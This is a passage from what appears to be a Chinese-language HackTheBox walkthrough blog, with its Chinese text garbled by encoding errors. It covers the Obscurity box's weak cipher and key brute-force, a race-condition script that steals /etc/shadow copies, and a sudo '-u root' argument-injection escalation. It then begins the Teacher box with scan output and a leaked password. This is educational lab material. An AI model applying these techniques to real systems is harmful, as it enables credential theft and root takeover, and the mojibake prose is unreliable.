<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@obscure:&#x2F;home&#x2F;robert$ xxd passwordreminder.txt</span><br><span class="line">xxd passwordreminder.txt</span><br><span class="line">00000000: c2b4 c391 c388 c38c c389 c3a0 c399 c381  ................</span><br><span class="line">00000010: c391 c3a9 c2af c2b7 c2bf 6b              ..........k</span><br></pre></td></tr></table></figure>
<p><a href="http://SuperSecureCrypt.py">SuperSecureCrypt.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    encrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr + ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        encrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr - ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        decrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Encrypt with 0bscura\&#x27;s encryption algorithm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-i&#x27;</span>,</span><br><span class="line">                    metavar=<span class="string">&#x27;InFile&#x27;</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">&#x27;The file to read&#x27;</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>,</span><br><span class="line">                    metavar=<span class="string">&#x27;OutFile&#x27;</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">&#x27;Where to output the encrypted/decrypted file&#x27;</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-k&#x27;</span>,</span><br><span class="line">                    metavar=<span class="string">&#x27;Key&#x27;</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">&#x27;Key to use&#x27;</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, help=<span class="string">&#x27;Decrypt mode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">banner = <span class="string">&quot;################################\n&quot;</span></span><br><span class="line">banner+= <span class="string">&quot;#           BEGINNING          #\n&quot;</span></span><br><span class="line">banner+= <span class="string">&quot;#    SUPER SECURE ENCRYPTOR    #\n&quot;</span></span><br><span class="line">banner+= <span class="string">&quot;################################\n&quot;</span></span><br><span class="line">banner += <span class="string">&quot;  ############################\n&quot;</span></span><br><span class="line">banner += <span class="string">&quot;  #        FILE MODE         #\n&quot;</span></span><br><span class="line">banner += <span class="string">&quot;  ############################&quot;</span></span><br><span class="line">print(banner)</span><br><span class="line"><span class="keyword">if</span> args.o == <span class="literal">None</span> <span class="keyword">or</span> args.k == <span class="literal">None</span> <span class="keyword">or</span> args.i == <span class="literal">None</span>:</span><br><span class="line">    print(<span class="string">&quot;Missing args&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> args.d:</span><br><span class="line">        print(<span class="string">&quot;Opening file &#123;0&#125;...&quot;</span>.format(args.i))</span><br><span class="line">        <span class="keyword">with</span> open(args.i, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Decrypting...&quot;</span>)</span><br><span class="line">        decrypted = decrypt(data, args.k)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Writing to &#123;0&#125;...&quot;</span>.format(args.o))</span><br><span class="line">        <span class="keyword">with</span> open(args.o, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(decrypted)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Opening file &#123;0&#125;...&quot;</span>.format(args.i))</span><br><span class="line">        <span class="keyword">with</span> open(args.i, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Encrypting...&quot;</span>)</span><br><span class="line">        encrypted = encrypt(data, args.k)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Writing to &#123;0&#125;...&quot;</span>.format(args.o))</span><br><span class="line">        <span class="keyword">with</span> open(args.o, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(encrypted)</span><br></pre></td></tr></table></figure>
<p><a href="http://BetterSSH.py">BetterSSH.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">8</span>))</span><br><span class="line">session = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;authenticated&quot;</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = input(<span class="string">&quot;Enter username: &quot;</span>)</span><br><span class="line">    passW = input(<span class="string">&quot;Enter password: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;/etc/shadow&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    data = [(p.split(<span class="string">&quot;:&quot;</span>) <span class="keyword">if</span> <span class="string">&quot;$&quot;</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">    passwords = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">            passwords.append(x)</span><br><span class="line"></span><br><span class="line">    passwordFile = <span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;\n&#x27;</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(passwordFile)</span><br><span class="line">    time.sleep(<span class="number">.1</span>)</span><br><span class="line">    salt = <span class="string">&quot;&quot;</span></span><br><span class="line">    realPass = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> passwords:</span><br><span class="line">        <span class="keyword">if</span> p[<span class="number">0</span>] == session[<span class="string">&#x27;user&#x27;</span>]:</span><br><span class="line">            salt, realPass = p[<span class="number">1</span>].split(<span class="string">&#x27;$&#x27;</span>)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> salt == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid user&quot;</span>)</span><br><span class="line">        os.remove(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    salt = <span class="string">&#x27;$6$&#x27;</span>+salt+<span class="string">&#x27;$&#x27;</span></span><br><span class="line">    realPass = salt + realPass</span><br><span class="line">    hash = crypt.crypt(passW, salt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hash == realPass:</span><br><span class="line">        print(<span class="string">&quot;Authed!&quot;</span>)</span><br><span class="line">        session[<span class="string">&#x27;authenticated&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Incorrect pass&quot;</span>)</span><br><span class="line">        os.remove(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    os.remove(os.path.join(<span class="string">&#x27;/tmp/SSH/&#x27;</span>,path))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    traceback.print_exc()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> session[<span class="string">&#x27;authenticated&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = input(session[<span class="string">&#x27;user&#x27;</span>] + <span class="string">&quot;@Obscure$ &quot;</span>)</span><br><span class="line">        cmd = [<span class="string">&#x27;sudo&#x27;</span>, <span class="string">&#x27;-u&#x27;</span>,  session[<span class="string">&#x27;user&#x27;</span>]]</span><br><span class="line">        cmd.extend(command.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">        o,e = proc.communicate()</span><br><span class="line">        print(<span class="string">&#x27;Output: &#x27;</span> + o.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        print(<span class="string">&#x27;Error: &#x27;</span>  + e.decode(<span class="string">&#x27;ascii&#x27;</span>)) <span class="keyword">if</span> len(e.decode(<span class="string">&#x27;ascii&#x27;</span>)) &gt; <span class="number">0</span> <span class="keyword">else</span> print(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>ç°åœ¨å·²çŸ¥æ¡ä»¶æ˜¯æ˜æ–‡check.txtï¼Œå¯†æ–‡out.txtï¼Œä»¥åŠåŠ å¯†ç®—æ³•encryptï¼Œæ±‚è§£å¯†é’¥ï¼Œçˆ†ç ´Pythonä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;check.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mingwen = f.read()</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    miwen = f.read()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(len(mingwen)):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">            ch = chr((ord(miwen[c]) - i) % <span class="number">255</span>)</span><br><span class="line">            <span class="keyword">if</span> ch == mingwen[c]:</span><br><span class="line">                key += chr(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°å¯†é’¥<code>alexandrovich</code>ï¼Œè§£å¯†<code>passwordreminder.txt</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200306193554.png" alt=""></p>
<p>ä½¿ç”¨è¿™ä¸ªå¯†ç ç™»å½•robertçš„SSHç»ˆç«¯ï¼Œè·å¾—user.txtã€‚</p>
<p><code>sudo -l</code>æŸ¥çœ‹èƒ½å¤Ÿä»¥rootèº«ä»½æ‰§è¡Œçš„å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">robert@obscure:~$ sudo -l</span><br><span class="line">Matching Defaults entries for robert on obscure:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User robert may run the following commands on obscure:</span><br><span class="line">    (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;home&#x2F;robert&#x2F;BetterSSH&#x2F;BetterSSH.py</span><br></pre></td></tr></table></figure>
<p>å®¡è®¡æºç å‘ç°å…³é”®ç‚¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/etc/shadow&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">data = [(p.split(<span class="string">&quot;:&quot;</span>) <span class="keyword">if</span> <span class="string">&quot;$&quot;</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">passwords = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">        passwords.append(x)</span><br><span class="line"></span><br><span class="line">passwordFile = <span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;\n&#x27;</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/tmp/SSH/&#x27;</span>+path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(passwordFile)</span><br></pre></td></tr></table></figure>
<p>ç¨‹åºä¼šå°† <code>/etc/shadow</code> å†™å…¥åˆ° <code>/tmp/SSH</code> çš„æŸä¸ªéšæœºçš„ç›®å½•ä¸­ï¼Œäºæ˜¯æƒ³åˆ°æˆ‘ä»¬åªéœ€è¦å†™ä¸ªæ­»å¾ªç¯ä¸æ–­åœ°å¤åˆ¶è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    files = os.listdir(<span class="string">&quot;./SSH&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        shutil.copy(os.path.join(<span class="string">&quot;./SSH&quot;</span>, file), <span class="string">&quot;./flag&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>ç„¶åæˆ‘ä»¬æ‰§è¡Œå°±ä¼šå‘ç° <code>flag</code> ç›®å½•ä¸­å­˜åœ¨æ–‡ä»¶</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200308225922.png" alt=""></p>
<p>å†ç”¨Johnå…‰é€Ÿè§£å¯†å¾—åˆ°mercedesï¼Œææƒ</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200308230202.png" alt=""></p>
<p>è¿˜æœ‰ä¸€ç§æ›´å¸¸è§„çš„ææƒæ–¹æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> session[<span class="string">&#x27;authenticated&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = input(session[<span class="string">&#x27;user&#x27;</span>] + <span class="string">&quot;@Obscure$ &quot;</span>)</span><br><span class="line">        cmd = [<span class="string">&#x27;sudo&#x27;</span>, <span class="string">&#x27;-u&#x27;</span>,  session[<span class="string">&#x27;user&#x27;</span>]]</span><br><span class="line">        cmd.extend(command.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br></pre></td></tr></table></figure>
<p><code>sudo -u robert -u root</code>ä¼šè¦†ç›–å‰é¢ä¸€ä¸ª<code>-u</code>çš„å‚æ•°å€¼ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200309101541.png" alt=""></p>
<h2 id="0x04-Summary">0x04 Summary</h2>
<p>Obscurityé¶æœºæ˜¯æˆ‘åšçš„ç¬¬ä¸€ä¸ªä¸æ˜¯CVEç±»å‹çš„é¶æœºï¼Œæºç å®¡è®¡èµ·æ¥æœ‰äº›åƒåŠ›ï¼Œå¤šçœ‹çœ‹è¿™ç§ç±»å‹çš„åº”è¯¥ä¼šå¥½ä¸€äº›ã€‚é¦–å…ˆæ˜¯æœåŠ¡å™¨æºç å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä»è€Œåå¼¹shellï¼Œä»¥<code>www-data</code>çš„èº«ä»½ç™»å½•é¶æœºã€‚ç„¶åä½œè€…æä¾›äº†ä¸€ä¸ªå¯†æ–‡ã€æ˜æ–‡ä»¥åŠåŠ è§£å¯†ç®—æ³•ï¼Œè®©æˆ‘ä»¬å†™è„šæœ¬çˆ†ç ´å‡ºå¯†é’¥ï¼Œé€šè¿‡è¿™ä¸ªå¯†é’¥å¾—åˆ°robertç”¨æˆ·çš„ç™»å½•å¯†ç ï¼Œå¾—åˆ°<code>user.txt</code>ã€‚ç„¶ååœ¨<code>BetterSSH.py</code>ä¸­å­˜åœ¨ä¸¤å¤„å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œç¬¬ä¸€å¤„æ¼æ´æœ‰ç‚¹ç±»ä¼¼äºæ¡ä»¶ç«äº‰ï¼Œç”¨ä¸€ä¸ªæ­»å¾ªç¯çš„è„šæœ¬æŠŠ<code>BetterSSH.py</code>ä»<code>/etc/shadow</code>å¤åˆ¶åˆ°<code>/tmp/SSH</code>çš„æ–‡ä»¶å†æ¬¡å¤åˆ¶åˆ°ä¸€ä¸ªè‡ªå®šä¹‰çš„ç›®å½•ä¸‹é¢ï¼Œä»è€Œå¾—åˆ°<code>root</code>çš„å¯†ç ã€‚ç¬¬äºŒå¤„æ¼æ´ï¼Œè™½ç„¶<code>-u</code>å‚æ•°æŒ‡å®šäº†å½“å‰ç”¨æˆ·çš„æƒé™æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ç”¨æˆ·è¾“å…¥çš„ç¬¬äºŒä¸ª<code>-u root</code>å¯ä»¥è¦†ç›–æ‰ç¬¬ä¸€ä¸ª<code>-u</code>å‚æ•°ä»è€Œç»•è¿‡ã€‚æ€»çš„æ¥è¯´ï¼Œå®¡è®¡ä»£ç å’Œç¼–å†™ä»£ç çš„èƒ½åŠ›éƒ½æœ‰å¾…åŠ å¼ºã€‚</p>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://www.leavesongs.com/PYTHON/python-shell-backdoor.html">https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Teacher Walkthrough</title>
    <url>/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Teacher-Walkthrough">HTB::Teacher Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322120324.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>nikto</li>
<li>dirb</li>
<li>dirsearch</li>
<li>hydra</li>
<li>hash-identifier</li>
<li>Moodle 3.4.1 - Remote Code Execute</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>nmapæ‰«æé¶æœºTCPç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Î» nmap -sV -A -Pn -T4 10.10.10.153</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-22 13:08 ?D1ÃºÂ±ÃªÃ—?ÃªÂ±??</span><br><span class="line">Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 56.13% done; ETC: 13:08 (0:00:04 remaining)</span><br><span class="line">Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute</span><br><span class="line">Traceroute Timing: About 32.26% done; ETC: 13:08 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.10.10.153</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.25 (Debian)</span><br><span class="line">|_http-title: Blackhat highschool</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; ).</span><br><span class="line">TCP&#x2F;IP fingerprint:</span><br><span class="line">OS:SCAN(V&#x3D;7.80%E&#x3D;4%D&#x3D;3&#x2F;22%OT&#x3D;80%CT&#x3D;1%CU&#x3D;39891%PV&#x3D;Y%DS&#x3D;2%DC&#x3D;T%G&#x3D;Y%TM&#x3D;5E76F2E</span><br><span class="line">OS:3%P&#x3D;i686-pc-windows-windows)SEQ(SP&#x3D;104%GCD&#x3D;1%ISR&#x3D;10A%TI&#x3D;Z%CI&#x3D;I%II&#x3D;I%TS&#x3D;8</span><br><span class="line">OS:)SEQ(CI&#x3D;I%II&#x3D;I)OPS(O1&#x3D;M54DST11NW7%O2&#x3D;M54DST11NW7%O3&#x3D;M54DNNT11NW7%O4&#x3D;M54D</span><br><span class="line">OS:ST11NW7%O5&#x3D;M54DST11NW7%O6&#x3D;M54DST11)WIN(W1&#x3D;7120%W2&#x3D;7120%W3&#x3D;7120%W4&#x3D;7120%W</span><br><span class="line">OS:5&#x3D;7120%W6&#x3D;7120)ECN(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;7210%O&#x3D;M54DNNSNW7%CC&#x3D;Y%Q&#x3D;)T1(R&#x3D;Y%DF&#x3D;Y</span><br><span class="line">OS:%T&#x3D;40%S&#x3D;O%A&#x3D;S+%F&#x3D;AS%RD&#x3D;0%Q&#x3D;)T2(R&#x3D;N)T3(R&#x3D;N)T4(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F</span><br><span class="line">OS:&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T5(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)T6(R&#x3D;Y%DF&#x3D;Y%</span><br><span class="line">OS:T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T7(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD</span><br><span class="line">OS:&#x3D;0%Q&#x3D;)U1(R&#x3D;Y%DF&#x3D;N%T&#x3D;40%IPL&#x3D;164%UN&#x3D;0%RIPL&#x3D;G%RID&#x3D;G%RIPCK&#x3D;G%RUCK&#x3D;G%RUD&#x3D;G)IE</span><br><span class="line">OS:(R&#x3D;Y%DFI&#x3D;N%T&#x3D;40%CD&#x3D;S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 110&#x2F;tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   230.00 ms 10.10.14.1</span><br><span class="line">2   232.00 ms 10.10.10.153</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 41.73 seconds</span><br></pre></td></tr></table></figure>
<p>ç”¨dirsearchæ‰«æç½‘ç«™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[01:00:42] 301 -  310B  - &#x2F;css  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;css&#x2F;                                     [01:00:54] 301 -  312B  - &#x2F;fonts  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;fonts&#x2F;                                 [01:01:01] 301 -  313B  - &#x2F;images  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;images&#x2F;                               [01:01:03] 200 -    8KB - &#x2F;index.html                                                           [01:01:06] 301 -  317B  - &#x2F;javascript  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;javascript&#x2F;                       [01:01:07] 301 -  309B  - &#x2F;js  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;js&#x2F;</span><br><span class="line">[01:01:15] 301 -  313B  - &#x2F;manual  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;manual&#x2F;</span><br><span class="line">[01:01:15] 200 -  626B  - &#x2F;manual&#x2F;index.html</span><br><span class="line">[01:01:19] 301 -  313B  - &#x2F;moodle  -&gt;  http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>å»çœ‹ä¸€ä¸‹imagesç›®å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322132156.png" alt=""></p>
<p>ä¸€ä¸ªä¸ªç‚¹å¼€çœ‹ä¸€ä¸‹ï¼Œå‘ç°<code>5.png</code>æ— æ³•æ˜¾ç¤ºï¼Œåº”è¯¥ä¸æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œä¸‹è½½åç”¨Notepad++æ‰“å¼€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hi Servicedesk,</span><br><span class="line"></span><br><span class="line">I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.</span><br><span class="line"></span><br><span class="line">Could you guys figure out what the last charachter is, or just reset it?</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">Giovanni</span><br></pre></td></tr></table></figure>
<p>è®©æˆ‘ä»¬çŒœè§£å¯†ç çš„æœ€åä¸€ä½ï¼Œä½†æ˜¯ç°åœ¨ä¸çŸ¥é“ç”¨æˆ·åå’Œå¯†ç æ˜¯ç”¨åœ¨å“ªç™»å½•çš„ï¼Œå†å»çœ‹<code>moodle</code>ç›®å½•</p>
<blockquote>
<p>Moodleæ˜¯ä¸€ä¸ªå¼€æºè¯¾ç¨‹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸ºå­¦ä¹ ç®¡ç†ç³»ç»Ÿï¼ˆLMSï¼‰æˆ–è™šæ‹Ÿå­¦ä¹ ç¯å¢ƒï¼ˆVLEï¼‰ã€‚å®ƒå·²æˆä¸ºæ·±å—ä¸–ç•Œå„åœ°æ•™è‚²å·¥ä½œè€…å–œçˆ±çš„ä¸€ç§ä¸ºå­¦ç”Ÿå»ºç«‹ç½‘ä¸ŠåŠ¨æ€ç½‘ç«™çš„å·¥å…·ã€‚</p>
</blockquote>
